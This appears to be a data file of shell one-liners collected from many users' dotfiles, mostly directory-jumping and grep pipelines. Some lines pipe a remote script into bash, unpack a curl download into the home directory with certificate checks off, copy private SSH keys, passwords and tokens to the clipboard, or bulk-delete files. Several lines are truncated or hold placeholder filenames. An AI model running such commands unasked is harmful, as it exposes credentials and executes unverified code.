cd ~/ddd | wget
cd ~/datmo_ws && find src/localization/src/ -ignore_readdir_race |entr -p catkin_make -DCATKIN_WHITELIST_PACKAGES=localization
cd ~/datmo_ws && find src/datmo/src/ -ignore_readdir_race |entr catkin_make -DCATKIN_WHITELIST_PACKAGES=datmo -DCMAKE_EXPORT_COMPILE_COMMANDS=ON
cd ~/co/release && svn info | grep URL
cd ~/books/; ls | lolcat
cd ~/bin; find .m* stk/ -name '*' -type f | xargs grep --color
cd ~/Work/typekit-ops/chef; bundle exec knife node list | grep tkc
cd ~/Wallpaper/WSW ; feh --bg-fill | youtube-dl --write-thumbnail --skip-download https://www.youtube.com/watch?v=7v3YQ8BomKs
cd ~/Repos/fdp-devops && git checkout master && git pull origin master && cd ./code && find . -mindepth 1 -maxdepth 1 -type d -print | parallel git -C {} pull \;
cd ~/Rail/rail && make clean all install fs 2>&1 | tee ~/build.log
cd ~/Projects/$(ls ~/Projects | fzy)
cd ~/Projects/$(ls ~/Projects | fzf)
cd ~/Google\ Drive/School/Spring\ 2019/MAS3105\ \|\ Matrix\ and\ Linear
cd ~/Dropbox/moat_notes && tree -Drt | head -n 30
cd ~/Dropbox/hackNY/$(date | awk '{print $6}')
cd ~/Dropbox/Projects/; ls -1F . | grep /
cd ~/Downloads && find . -type f -maxdepth 1 -print0 | xargs -0 stat -f \
cd ~/Downloads && ${lslaVar} | head -30
cd ~/Documents/$(ls ~/Documents | fzy)
cd ~/Desktop/School/Senior\ \|\ Fall/MachineLearning/
cd ~/Design/; ls -1F . | grep /
cd ~/Codes/private/$(ls ~/Codes/private | fzf)
cd ~/Codes/$(ls ~/Codes | fzy)
cd ~/Codes/$(ls ~/Codes | fzf)
cd ~/Code/remedy/; ls -1F . | grep /
cd ~/Code/open-source/; ls -1F . | grep /
cd ~/Code/moment/; ls -1F . | grep /
cd ~/Code/knowme/; ls -1F . | grep /
cd ~/Code/kenzielane/; ls -1F . | grep /
cd ~/Code/benjamincharity/; ls -1F . | grep /
cd ~/Code/Terminus/; ls -1F . | grep /
cd ~/Code/; ls -1F . | grep /
cd ~/.vim/bundle && find ./ -maxdepth 1 -type d | xargs -I x bash -c 'cd x; git fetch; git pull; cd -'
cd ~/.emacs.d ; find . -name '*.elc' | xargs rm
cd ~/.dotfiles; cat brew-packages.txt | xargs brew install
cd ~/.dot-files; ls -1F . | grep /
cd ~/$(ghq-list | peco)
cd ~/ && rm -rf ~/.yarn && curl -o- -L https://yarnpkg.com/install.sh | bash -s -- --nightly
cd ~ && fortune|cowsay
cd ~ && echo SHOWER-THOUGHTS | lolcat; python resources/scripts/joke/get-joke && cd $OLDPWD
cd ~ && curl -Lk# https://github.com/n8felton/dotfiles/tarball/master | tar --strip-components 1 -xz && source .bash_profile
cd ~ && cat .zshrc | grep alias
cd ~ && cat .bashrc | grep alias
cd ~ && bash ./.dnstest.sh |sort -k 22 -n
cd ~ && ${codeDir}/Bin/pianobarfly/pianobarfly.exe | tee ~/.config/pianobarfly/custom-out
cd pdf;evince `ls -tr | grep
cd packages/$(ls packages | peco)
cd find . -type d | fzf
cd backend && mvn clean install && cd .. && echo | envchain aws ./deploy.sh
cd `pwd | sed s/test/app/`
cd `pwd | sed s/app/test/`
cd `pwd | cut -d/ -f -5`
cd `pwd -P` >& ~/X; expr `pwd|xargs basename` ==
cd `npm prefix | tr '\\\\' '/'`
cd `ls ~/projects/mo/scview-2*/ -d | tail -1 `; cd bin;
cd `ls ~/projects/mo/prod-2*/ -d | tail -1 `; cd bin;
cd `ls ~/projects/mo/optboard-2*/ -d | tail -1 `; cd bin;
cd `ls ~/projects/mo/hvol-2*/ -d | tail -1 `; cd bin;
cd `ls ~/projects/mo/deman-2*/ -d | tail -1 `; cd bin;
cd `ls |peco`
cd `ls | tail -1`
cd `ls | peco`
cd `ls | fzf`
cd `ls -t | head -1`
cd `ls -d ~/project/* ~/go/src/* |peco`
cd `ls -d */ | fzf`
cd `ls -1t -d */ | head -n1`
cd `ghq list -p | peco`
cd `ghq list -p | fzf`
cd `ghq list --full-path | fzf`
cd `find ~/Develop/ | peco`
cd `find ~/Develop/ -maxdepth 3 -type d | peco`
cd `find . -type d | percol`
cd `find . -type d | fzf`
cd `find . -maxdepth 1 -type d | fzf`
cd `/bin/ls -d -1 -t /home/ian/workspace/Sift/neo-fuzz/trunk/code/test/results/* |head -1`
cd \`find . -type d | fzf\`
cd \$(lsltr | tail -1)
cd \$(ls -l|fzf)
cd \$(ls -d */ | fzf --height=15 --border --margin=1)
cd \$(ghq root)/\$(ghq list | peco)
cd \$(ghq list -p | fzf --reverse)
cd \$(find \$(pwd) -type d -exec test -e '{}/.git' ';' -print -prune | fzf)
cd \$(find . -maxdepth 1 -type d | awk 'NR==1{print \$1}')
cd \$(find . -maxdepth 1 -type d | awk 'END{print \$NF}')
cd \$(find -type d | fzy)
cd \$(fasd -dlR | fzf +s)
cd /var/www/fruit-dashboard/app/storage/logs/; tail -f $(ls -t err.txt generated.file succ.txt | head -1);
cd /var/www/ && sudo chmod -R g+rwx err.txt generated.file succ.txt && sudo chown -R www-data:www-data err.txt generated.file succ.txt && sudo chown root:www-data err.txt generated.file succ.txt && sudo chmod 770 *; find /var/www/ -type d -print | sudo xargs chmod -f g+s;cd -;
cd /var/qmail/queue && find intd todo local remote mess info bounce -type f -print |xargs rm
cd /var/qmail/queue && find bounce -type f -print |xargs rm
cd /usr/share/logstash; /usr/share/logstash/bin/logstash-plugin list| grep nuage
cd /source/directory; tar cf - . | tar xf - -C /destination/directory
cd /projects/wom && tail -f -n0 storage/logs/* | grep '#0'
cd /proc&&ps a -opid=|xargs -I+ sh -c '[[ $PPID -ne + ]]&&echo -e \
cd /media/usb1 | more
cd /home/users/zhouping01/workspace/doing/task/bztask/ && find . -type f -mmin -10 |grep -v \
cd /home/tom/svn/root && ls && ls $(find -type d -maxdepth 1 |fzy)
cd /home/phi/journal && cat >> `date +%F`&& date +%c | tac >> `date +%F`
cd /home/itt/pySpree/PY_notes/ ; ls -tr|grep note
cd /home/alanding/software/xmind-8/XMIND_amd64/ | ./XMind
cd /etc/apache2-dev/sites-enabled; ls -al | grep craig
cd /app/spinnaker_logs/reports/\`ls /app/spinnaker_logs/reports | tail -n 1\`/run_1/provenance_data
cd /Users/jpchen/pokego-bot; ./run.sh 2> >( tee /dev/stderr | grep --line-buffered pokemon_caught >> out )
cd /Users/hktouw/Dropbox/notes/github/go-playground && mkdir `date +%s` && cd `date +%s` && cp ../template.go main.go && echo `pwd` | pbcopy && vim main.go
cd /Users/BadPhoenix/Desktop/Coding/Jupyter && runv jupyter && echo '***************************** JUPYTER NOTEBOOKS *****************************' && ls | grep -i '.ipynb$' && echo
cd /Applications/VNC\ Viewer.app/Contents/MacOS/ && ./vncviewer -listen 5500 | echo 'vnc listener is now running.'
cd ./`ls -td err.txt generated.file succ.txt | head -1`
cd '$(find ~/Desktop | while read line; do [[ -L
cd && cd $(find . | percol)
cd ${yoctoBuildDirFull}; find $logPath -type l | xargs grep '^WARNING:'
cd ${yoctoBuildDirFull}; find $logPath -type l | xargs grep '^ERROR:'
cd ${srcdir}/hpbuild;make 2>&1 |tee bld\${RANDOM}.out;cd -
cd ${air}console && rm -f ${air}testfile.dat && time ./stp_dl.py -G sled -v `echo $(hostname) | sed -r 's/testrig/devil/'` /tmp/testfile.dat /air/testfile.dat
cd ${air}console && ./spire_console.py `echo $(hostname) | sed -r 's/testrig/devil/'`
cd ${HOME}/.config/etc/dotfiles && ll | grep '^[d]'
cd ${GHQ_ROOT}/$(ghq list | fzf)
cd ${CHIP8_ROOT_DIR}/build; make 2>&1 | less
cd $pr/$(ls -l -1 $pr | fzy -l 15) && ls -l
cd $pc_path && echo https://gitlab.relexsolutions.com/DevHEL/planning-cloud/commit/$(git log -1 --pretty=%h) | pbcopy
cd $h_path && echo https://gitlab.relexsolutions.com/cat/heimdall/heimdall/commit/$(git log -1 --pretty=%h) | pbcopy
cd $devLocations/Git && git clone $1 && cd $(ls -t |head -n 1)
cd $app_dir && yes | gvm install grails $grails_version && gvm use grails $grails_version && grails -Divy.cache.dir=$IVY2_CACHE test-app
cd $app_dir && yes | gvm install grails $grails_version && gvm use grails $grails_version && grails -Divy.cache.dir=$IVY2_CACHE -Dserver.port=$port run-app
cd $SYSTEM_SVN_BASE; project_files_list | perl -pe
cd $SYSTEM_CVS_BASE; export CUR_PROJECT_DIR=$SYSTEM_PROJECT_BASE/`cat ~/.current_project`; cat $CUR_PROJECT_DIR/affected_files.txt | egrep -v
cd $OFFSEC_DIR/offsec_connectivity_pack; cat auth.txt | cs; ./connect.sh
cd $HOME/exercism/go/$(ls -t $HOME/exercism/go/ | head -1)
cd $HOME/dev/src/$(ghq list | peco)
cd $HOME/code/exercism/go/$(ls -t $HOME/code/exercism/go/ | head -1)
cd $HOME/Documents/DotFiles-GitHub.com/.All-DotFiles ; pwd ; echo 'Open GitBox for PushTo GitHub' ; echo -e '\033[36m+------------------------------------------------+ \n|\033[0m' ; ls -a
cd $HOME/.ghq/$(ghq list | fzf --reverse --ansi)
cd $HOME && cat .bashrc | grep alias
cd $GHQ_ROOT/$(ghq list | peco)
cd $CONECTA_DIR && currentinfraversion | ./CopyLocalInfraToPackages.bat && cd -
cd $COLLATION_HOME/log/sensors/\`ls -1 $COLLATION_HOME/log/sensors | tail -1\`
cd $CODEDIR && etags `find $CODEDIR -name '*.cpp' -o -name '*.[c|h]'` && cd -
cd $AMPL;findcwd README \| grep -v vcf_hack;cd -
cd $ABP_APR_ROOT/log/ES1008/$(ls -t $ABP_APR_ROOT/log/ES1008/ |head -1)
cd $1 | ls
cd $(tmux showenv -g tempdir | cut -d\= -f2)
cd $(tac ~/.cd_history | peco)
cd $(sh 'find err.txt generated.file succ.txt -type d | fzf')
cd $(pwd | sed s!/javatests/!/java/!)
cd $(pwd | sed s!/java/!/javatests/!)
cd $(prl $dirstack | fzf)
cd $(ls|percol)&&ls
cd $(ls | percol)
cd $(ls | fzf)
cd $(ls -tr | tail -n 1)
cd $(ls -td ~/Documents/Projects/Atmega328/*/ | head -1)
cd $(ls -td -- */ | head -n 1)
cd $(ls -t | head -1)
cd $(ls -r | head -1)
cd $(ls -dtr */ | tail -1)
cd $(ls -dt1 */ | head -1)
cd $(ls -dr ./*/ | head -1)
cd $(ls -d ~/code/zendesk/*/ | fzf)
cd $(ls -d /tmp/tmpd* | tail -n1)
cd $(ls -d ./*/ | head -1)
cd $(ls -d */ | peco --layout bottom-up)
cd $(ls -d */ | fzf)
cd $(ls -c | head -n1)
cd $(ls -a | peco)
cd $(ls -A | peco)
cd $(ls -1rtd /media/scratch/observer/LuMP_DE60?_reduced/B*/2*/ | tail -n1); . ~/PSR_8bit_Scripts/setup.sh ; ~/PSR_8bit_Scripts/zap_with_DAB_5C_6B_6D.psh -ez B*ar; psrplot -jDTp -pF -D test_obs.ps/CPS B*z
cd $(ls -1rtd /media/scratch/observer/LuMP_DE60?_reduced/B*/2*/ | tail -n1); . ~/PSR_8bit_Scripts/setup.sh ; ~/PSR_8bit_Scripts/zap_with_DAB_5C_6B_6D.psh -ez B*ar; for x in B*z; do pazi $x; done; rm B*z
cd $(ls -1rtd */ | tail -1); lk
cd $(hg root) && hg diff -U0 -r . | clang-format-diff.py -p 1 -i && cd -
cd $(grep 'XDG_DESKTOP_' $HOME/.config/user-dirs.dirs | cut -d= -f2)
cd $(gowl list | fzf)
cd $(git rev-parse --show-superproject-working-tree --show-toplevel | head -1)
cd $(git remind status -n | fzf)
cd $(ghq root)/$(ghq list|sk)
cd $(ghq root)/$(ghq list |peco) && nvim
cd $(ghq root)/$(ghq list |peco)
cd $(ghq root)/$(ghq list | peco)
cd $(ghq root)/$(ghq list | fzy)
cd $(ghq root)/$(ghq list | fzf); vi .
cd $(ghq root)/$(ghq list | fzf)
cd $(ghq root)/$(ghq list | fzf --no-sort)
cd $(ghq root)/$(ghq list | fzf --no-multi)
cd $(ghq root)/$(ghq list | fzf +s --height=40% --reverse)
cd $(ghq root)/$(ghq list | $FILTERING_TOOL)
cd $(ghq list -p |peco)
cd $(ghq list -p | sk)
cd $(ghq list -p | peco); pwd
cd $(ghq list -p | peco)
cd $(ghq list -p | fzy)
cd $(ghq list -p | fzf-tmux)
cd $(ghq list -p | fzf)
cd $(ghq list -p | fzf --ansi)
cd $(ghq list -p | fzf --ansi --exit-0)
cd $(ghq list --full-path | pf)
cd $(ghq list --full-path | percol)
cd $(ghq list --full-path | peco)
cd $(ghq list --full-path | peco --query hacker65536)
cd $(ghq list --full-path | peco )
cd $(ghq list --full-path | fzf)
cd $(findsrc -type d | fzfls)
cd $(find ~/src/github.com -follow -maxdepth 2 -mindepth 2 -type d|peco)
cd $(find ~/src -follow -maxdepth 3 -mindepth 3 -type d|fzf)
cd $(find ~/src -follow -maxdepth 3 -mindepth 3 -type d | fzf)
cd $(find ~/projects/trials -type d -maxdepth 2 | fzf)
cd $(find ~/projects -maxdepth 1 -type d | selecta)
cd $(find ~/mycode/ -maxdepth 1 -type d| pick)
cd $(find ~/go/src -type d -maxdepth 4 | fzf)
cd $(find ~/code/projects -maxdepth 1 -type d | fzf)
cd $(find ~/.go/src -follow -maxdepth 3 -mindepth 3 -type d|peco)
cd $(find /home/ben/git/* -prune | fzf)
cd $(find . type d | fzf)
cd $(find . -type d| pick)
cd $(find . -type d | pick)
cd $(find . -type d | peco)
cd $(find . -type d | fzf)
cd $(find . -type d | fzf --no-mouse --layout=reverse)
cd $(find . -type d -maxdepth 1 | peco)
cd $(find . -maxdepth 5 -type d | peco)
cd $(find . -maxdepth 1 -type d | peco)
cd $(find . -maxdepth 1 -type d | fzf)
cd $(find -type d | fzy)
cd $(find -type d | fzfls)
cd $(find -type d | fzf)
cd $(find err.txt generated.file succ.txt -type d | selecta)
cd $(find err.txt generated.file succ.txt -type d | fzf)
cd $(find $PWD -maxdepth 1 -type d | fzf)
cd $(find $HOME | peco)
cd $(find $GOPATH/src -type d -mindepth 3 -maxdepth 3 | peco)
cd $(find $GITHUB -maxdepth 2 -type d | fzf) && hub browse && cd -
cd $(find $FZF_FIND_PATH -type d | fzf)
cd $(find $* | peco)
cd $(fd | fzf)
cd $(fd . --full-path ${HOME} -t d | fzf)
cd $(fd -t d | fzf)
cd $(fd -t d | fzf --preview 'tree {}')
cd $(fd -t d --hidden | fzf --preview-window=right:hidden)
cd $(fd -H -t d | fzf)
cd $(fd -H -t d -j 12 | fzy -j 4)
cd $(fd --type d --exclude node_modules --exclude vendor --exclude build --exclude _build --exclude bundle --exclude Godeps | fzf)
cd $(fasd -ld | fzf)
cd $(fasd -l -d | fzf)
cd $(fasd -dlR | fzf --height 50% --reverse)
cd $(fasd -d -l -R learning | head -1) && source activate dev-env && vim
cd $(echo $PATH | ruby -ne
cd $(echo $HOME | sed -e 's/home/lustre/')
cd $(echo $CMAKE_PREFIX_PATH | cut -d
cd $(dirs -lp|percol)
cd $(dirname $(find / -name Homestead.yaml 2>/dev/null | head -n 1)); vagrant reload --provision;
cd $(dirname $(find . | tail -n 1))
cd $(dirname $(find . | tail -1))
cd $(cut -d= -f2- .named_directories | fzf)
cd $(command ls -t | head -n 1)
cd $(cat ~/.config/bookmarks | fzf)
cd $(__bookmarklist | sk)
cd $(\ls -a -d .. err.txt generated.file succ.txt | percol --prompt-bottom --result-bottom-up);ls
cd $(\ls -1t | head -n 1)
cd $(\ls -1dt ~/Documents/GW/homeworks/*/ | head -n 1)
cd $(\ls -1dt ./*/ | head -n 1)
cd $( ghq list --full-path | peco )
cd $( dirname $(ls -t $ORACLE_BASE/diag/rdbms/*/$ORACLE_SID/trace/alert_$ORACLE_SID.log | head -1) )
ccze -m ansi | less -MnFRX
ccze -A |`type -P less` -R
ccze -A | less +G -R
ccze -A | less
ccze -A | grep -E --color=always
ccopy < ~/.ssh/id_ed25519.pub | echo '=> Public key copied to pasteboard.'
ccopy < ~/.ssh/id_ed25519 | echo '=> Private key copied to pasteboard.'
ccat ~/data/dingo.txt.cpt | grep
ccat ~/.bash_profile | more
ccat $0 | nl
cb2 -o | sed
cb1 -o | sed
cb | xargs git push origin
cb | grep
cb -o | sed
cava | lolcat
catkey | pbcopy
cat ~/zz_yum/yum.txt | grep
cat ~/zz_yum/yum.all.txt | grep
cat ~/work/organizer/accounts.txt| grep -i
cat ~/work/abs/librime/src/librime/data/minimal/cangjie5.dict.yaml | grep
cat ~/wiki/benutzerverwaltung/telefonliste.md | grep
cat ~/w3m_commentary/*.md | less
cat ~/vimwiki/Tasks.wiki | fzf --layout reverse --height 50%
cat ~/uw/uwgrades.csv | grep -i
cat ~/tip | grep -i $1
cat ~/temp | grep -i
cat ~/steem-docker/data/witness_node_data_dir/config.ini | grep --context=2 STM
cat ~/stage/WebSvc/logs/btserver.log | grep -i
cat ~/smo.list|grep
cat ~/router/nmap_info/MAC_addresses.txt | less
cat ~/ro_dock_pass.txt | docker login --username rohitpx --password-stdin
cat ~/resources/vpncriteo | clipcopy
cat ~/resources/storetail.pass | clipcopy; ssh ermsv1
cat ~/repositories/ArchLabs_on_MacBook/dotfiles/.zshrc | grep gpg
cat ~/repositories/ArchLabs_on_MacBook/dotfiles/.zshrc | grep git
cat ~/repos/PAT_GIT|c
cat ~/repos/PAT_GIT | c
cat ~/project/log/solo/game.log | grep Allow
cat ~/programs/vbs_download.txt | xsel -b ;echo Copied!
cat ~/password.md | xclip
cat ~/old_history.txt | grep
cat ~/notes/misc/emojis.md | grep :
cat ~/notes/\`ls -1t ~/notes | head -n1\`
cat ~/notes | grep
cat ~/my_docs/unsorted.wordlist.txt | grep
cat ~/my_cheatsheets/regex_cheatsheet.txt | less
cat ~/my/tmp/gem.lst | gri
cat ~/my-myth/* | fzf
cat ~/memos/saying.txt | gshuf -n 1
cat ~/mbox | formail -X From: -X Subject: -s sort
cat ~/linux/UnicodeCharts/UnicodeData.txt | grep -i
cat ~/lanengen.md | xclip
cat ~/haul.txt | nms -a -c
cat ~/favcommands.fav | grep
cat ~/etc/artifactory-api-key.txt | docker login --username ohulett --password-stdin docker.atl-paas.net
cat ~/emoji/emoji.txt | grep
cat ~/dump/solaris/deepblueradioshow.txt | ~/projects/Werkzeugkasten/scripts/punchline.pl -qsS ~/dump/solaris/listenedto.txt -- tmux new-window mpv --no-video --save-position-on-quit @
cat ~/dotfiles/zshrc | less
cat ~/dotfiles/zprezto/modules/git/alias.md | less
cat ~/dotfiles/vscode_extensions | xargs -L 1 code --install-extension
cat ~/dotfiles/tmux.cheat | less
cat ~/dotfiles/rcm-ignore/git-omz-doc.text | grep
cat ~/dotfiles/oh-my-zsh/custom/alias.zsh | less
cat ~/dotfiles/cheatsheet.md | grep -B 2 -A 5 $2
cat ~/dotfiles/OSX/brew.available.list | grep -i
cat ~/dot/win/.bash_history_laptop ~/dot/win/.bash_history ~/dot/lin/.bash_history | grep
cat ~/documents/pwd.txt | clip
cat ~/dev/awstoken | pbcopy
cat ~/dev/GitHubAccessToken.txt | xclip -selection clipboard
cat ~/dev/GitHubAccessToken.txt | clip.exe
cat ~/demo/sheetJson|xclip -i -selection clipboard
cat ~/data/4001 | xclip -sel clip
cat ~/code/template-abbrev.txt | pbcopy
cat ~/clobber.sql | mysql -uroot
cat ~/bin/expanding-texts/html | xclip -selection clipboard
cat ~/bin/cmus/rebuild-library | cmus-remote
cat ~/batman/batman_art_work/$(( RANDOM % (`ls -1U ~/batman/batman_art_work |wc -l`) + 1 ))
cat ~/bash_shortcuts.txt | less
cat ~/bash/functions.sh | less
cat ~/backup/gh-starred.json| jq -r
cat ~/all_folders2.db|fzy -l 20
cat ~/a.txt | sed
cat ~/Smb/contacts/work.txt | grep
cat ~/Scripts/openbsd | toilet -f term --gay
cat ~/Scripts/kullanilan/gitnotlari | less
cat ~/Scripts/kullanilan/bazikodlar | less
cat ~/SQL_cheatsheet.txt | less
cat ~/PJM/makefile_template | c2cb
cat ~/PJM/gitignore_template | c2cb
cat ~/Dropbox/org/utils/arch-memo.md | grep memo
cat ~/Dropbox/addressbook/work-zh | xclip -selection clipboard
cat ~/Dropbox/addressbook/work | xclip -selection clipboard
cat ~/Dropbox/addressbook/home | xclip -selection clipboard
cat ~/Documents/weather | head -7
cat ~/Documents/weather | head -37
cat ~/Documents/heartbeat | pbcopy
cat ~/Documents/fs1pwd.txt | pbcopy
cat ~/Documents/creds.txt | xclip -i -selection clipboard
cat ~/Documents/YYSB/transcription/transcription_all.txt | grep -n
cat ~/Documents/YYSB/transcription/transcription_all.txt | grep
cat ~/Documentos/comandos.txt | more
cat ~/Development/skynet/sky/sampleData/events.log| groovy ~/Development/skynet/sky/log-replayer/replay.groovy
cat ~/Dev/docker/docker_settings/.docker_aliases | grep alias
cat ~/Desktop/whoknows.txt | pbcopy
cat ~/Desktop/pp | pp > ~/Desktop/pp.json && sub ~/Desktop/pp.json
cat ~/Desktop/clipboard.txt | pbcopy
cat ~/Desktop/Dropbox/misc/vim_shortcuts_ref/vim_shortcuts.txt | fzf
cat ~/Desktop/$(day).md | pb
cat ~/Copy/cheats/sed | more
cat ~/CTS6/Datascience/pw.txt | xclip
cat ~/1 | $SB/src/pfe/tools/jemsym/jemsym *.sym
cat ~/1 | $SB/src/juniper/pfe/tools/jemsym/jemsym *.sym
cat ~/.zshrc|grep ^alias
cat ~/.zshrc| grep alias
cat ~/.zshrc | pbcopy
cat ~/.zshrc | grep task
cat ~/.zshrc | grep git
cat ~/.zshrc | grep docker
cat ~/.zshrc | grep cd
cat ~/.zshrc | grep alias && source ~/.zshrc
cat ~/.zshrc | grep alias
cat ~/.zshrc | grep ^alias
cat ~/.zshrc | grep \
cat ~/.zshrc | grep -i cool-peco
cat ~/.zshrc | grep '^alias'
cat ~/.zshrc | grep
cat ~/.zshrc | egrep \
cat ~/.zsh_history|ack --nocolor --nogroup -i
cat ~/.zsh_history* | grep -i
cat ~/.zsh_history |grep
cat ~/.zsh_history | rg
cat ~/.zsh_history | less
cat ~/.zsh_history | grep --text --color
cat ~/.zsh_history | grep
cat ~/.zsh_history | fzf
cat ~/.zsh_history | ag
cat ~/.zprofile | peco
cat ~/.zhistory |grep -i
cat ~/.zhistory | pygmentize
cat ~/.zhistory | grep -i
cat ~/.zhistory | grep
cat ~/.wcd/.treedata.wcd | egrep
cat ~/.w3m/config | grep extbrowser
cat ~/.vimrc | grep
cat ~/.vbuf |xargs
cat ~/.vbuf | xclip -sel clip
cat ~/.tmux.conf | xclip -sel clip
cat ~/.tmux.conf | grep tmux
cat ~/.things.cpt | ccrypt -d
cat ~/.ssh/wdg_id_rsa.pub | pbcopy
cat ~/.ssh/mysql-igst_pass | xclip -sel clip; ssh mysql-igst
cat ~/.ssh/known_hosts | awk '{print \$1}'
cat ~/.ssh/kami_pass | xclip -sel clip; ssh kami
cat ~/.ssh/jjpmann-4096-rsa.pub | pbcopy
cat ~/.ssh/igst_pass | xclip -sel clip; ssh igst
cat ~/.ssh/id_rsa_wdgdc.pub | pbcopy
cat ~/.ssh/id_rsa2.pub | pbcopy && echo 'ssh key copyed to clipboard!'
cat ~/.ssh/id_rsa.pub|pbcopy && echo 'SSH key copied to clipboard.'
cat ~/.ssh/id_rsa.pub|pbcopy
cat ~/.ssh/id_rsa.pub|cb
cat ~/.ssh/id_rsa.pub| xclip -selection clipboard
cat ~/.ssh/id_rsa.pub| pbcopy
cat ~/.ssh/id_rsa.pub|
cat ~/.ssh/id_rsa.pub |pbcopy
cat ~/.ssh/id_rsa.pub | xsel -i -b
cat ~/.ssh/id_rsa.pub | xsel -b
cat ~/.ssh/id_rsa.pub | xclip -selection clipboard
cat ~/.ssh/id_rsa.pub | xclip -selection c
cat ~/.ssh/id_rsa.pub | xclip -sel clip && echo 'Copied to the clipboard'
cat ~/.ssh/id_rsa.pub | xclip -sel clip && echo 'Copied to clipboard:\n\n'$(cat ~/.ssh/id_rsa.pub)
cat ~/.ssh/id_rsa.pub | xclip -sel clip
cat ~/.ssh/id_rsa.pub | xclip -i
cat ~/.ssh/id_rsa.pub | xclip
cat ~/.ssh/id_rsa.pub | xc
cat ~/.ssh/id_rsa.pub | tee >(pbcopy)
cat ~/.ssh/id_rsa.pub | ssh -t -t root@$DOCKER_REMOTE_HOST 'cat >> .ssh/authorized_keys'
cat ~/.ssh/id_rsa.pub | pbcopy; echo 'SSH key copied to clipboard!'
cat ~/.ssh/id_rsa.pub | pbcopy; echo 'Copied SSH key to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'copied'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'SSH key copied'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'SSH Key copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'SSH Key Copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'Public key copied'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'Public key copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'Copied to pasteboard.'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'Copied to clipobard'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'Copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'Copied to clipboard'
cat ~/.ssh/id_rsa.pub | pbcopy && echo 'Copied SSH key to clipboard 🔑'
cat ~/.ssh/id_rsa.pub | pbcopy && echo '=> Public key copied to pasteboard.'
cat ~/.ssh/id_rsa.pub | pbcopy && echo
cat ~/.ssh/id_rsa.pub | pbcopy
cat ~/.ssh/id_rsa.pub | clipcp
cat ~/.ssh/id_rsa.pub | clipcopy
cat ~/.ssh/id_rsa.pub | clip.exe
cat ~/.ssh/id_rsa.pub | cb
cat ~/.ssh/id_rsa.pub | 192.168.1.5 'cat >> .ssh/authorized_keys'
cat ~/.ssh/id_rsa | xclip -selection clipboard
cat ~/.ssh/id_rsa | clip.exe
cat ~/.ssh/id_jerome.pub | tee >(pbcopy)
cat ~/.ssh/id_ed25519.pub | pbcopy && echo '~/.ssh/ed25519.pub copied to clipboard'
cat ~/.ssh/id_dsa.pub | pbcopy && echo 'Copied to clipboard.'
cat ~/.ssh/id_dsa.pub | pbcopy
cat ~/.ssh/gst_pass | xclip -sel clip; ssh gst
cat ~/.ssh/gst_demo_pass | xclip -sel clip; ssh gst_demo
cat ~/.ssh/gst2_pass | xclip -sel clip; ssh gst2
cat ~/.ssh/github_rsa.key | pbcopy
cat ~/.ssh/fix_ssh_env | sh
cat ~/.ssh/config ~/.ssh/conf.d/**/*.conf | less
cat ~/.ssh/config | grep \
cat ~/.ssh/config | grep Host
cat ~/.ssh/config | grep -i
cat ~/.ssh/config | grep -A1 $1
cat ~/.ssh/config | grep --colour '^#'
cat ~/.ssh/config | grep 'Host '
cat ~/.ssh/config | grep
cat ~/.ssh/authorized_keys | xclip -sel clip
cat ~/.ssh/*/config >| ~/.ssh/config;ssh
cat ~/.ssh/*/config >| ~/.ssh/config;scp
cat ~/.ssh/*.pub |pbcopy && echo 'Keys copied to clipboard'
cat ~/.ssh/* | grep \
cat ~/.slack-term-bash | xargs go run ~/go/src/github.com/erroneousboat/slack-term/main.go --token $1
cat ~/.shrug | pbcopy
cat ~/.rdp_credentials/audi | xfreerdp /v:127.0.0.15:3390 /d:DEAUDI00 /u:v5v6roo /size:1920x1040 -grab-keyboard /from-stdin
cat ~/.rdp_credentials/audi | xfreerdp /v:127.0.0.14:3390 /d:DEAUDI00 /u:v5v6roo /size:1920x1040 -grab-keyboard /from-stdin
cat ~/.rdp_credentials/audi | xfreerdp /v:127.0.0.14:3390 /d:DEAUDI00 /u:v5v6roo /size:1364x704 -grab-keyboard /from-stdin
cat ~/.pws | less
cat ~/.pw/uni_vpn | cut -d
cat ~/.pry_history | grep
cat ~/.profile | pbcopy
cat ~/.pritunl.pin | pbcopy; open -a Pritunl
cat ~/.pman | less
cat ~/.persistent_history|grep -E --color
cat ~/.persistent_history|grep --color
cat ~/.persistent_history|grep
cat ~/.persistent_history | grep -i --color
cat ~/.persistent_history | grep --color
cat ~/.persistent_history | fzf
cat ~/.pass/bitbucket_wtelecom | xclip -sel clip
cat ~/.oneliners | grep
cat ~/.oh-my-zsh/plugins/git/git.plugin.zsh | grep '^alias'
cat ~/.oh-my-zsh/plugins/git/git.plugin.zsh | grep
cat ~/.offlineimap/pid | xargs kill -s USR1
cat ~/.npmrc | cut -d= -f2
cat ~/.notes | grep
cat ~/.nix-pkg-cache | grep
cat ~/.nanorc | grep
cat ~/.mystf | xsel -ib
cat ~/.my-zsh/custom/example.zsh | egrep '^\w'
cat ~/.motd.old |sudo -S -l
cat ~/.mag_links | while read line; do magnet_puller.py \
cat ~/.local/bin/mumblemove.sh | at $1
cat ~/.kube/config|grep current-context
cat ~/.kube/config | grep token
cat ~/.kodi/temp/kodi.log | pastebinit
cat ~/.i3/config | grep
cat ~/.hss.yml | grep -A 45 expansions:
cat ~/.history | grep
cat ~/.history | egrep
cat ~/.histfile| egrep
cat ~/.histfile | grep
cat ~/.histfile | ag
cat ~/.halp | shuf -n 1
cat ~/.globus/passwd | voms-proxy-init -rfc -voms ams02.cern.ch -cert ~/.globus/usercert.pem -key ~/.globus/userkey.pem -hours 168 -vomslife 168:0 -pwstdin
cat ~/.global_worker.pid | xargs kill -9
cat ~/.gitignore.sample | pbcopy && echo sample git ignore copied to the clipboard.
cat ~/.github_token | xclip -selection c; git push
cat ~/.gitconfig | grep
cat ~/.git_token | pbcopy
cat ~/.gems | shuf -n 1
cat ~/.ec2/mosburn.pem | pbcopy
cat ~/.dotfiles/vim/doc/shortcuts.txt | less
cat ~/.dotfiles/cheatsheet.txt | less --quit-if-one-screen --chop-long-lines --no-init
cat ~/.dotfiles/bash/bash_aliases | c
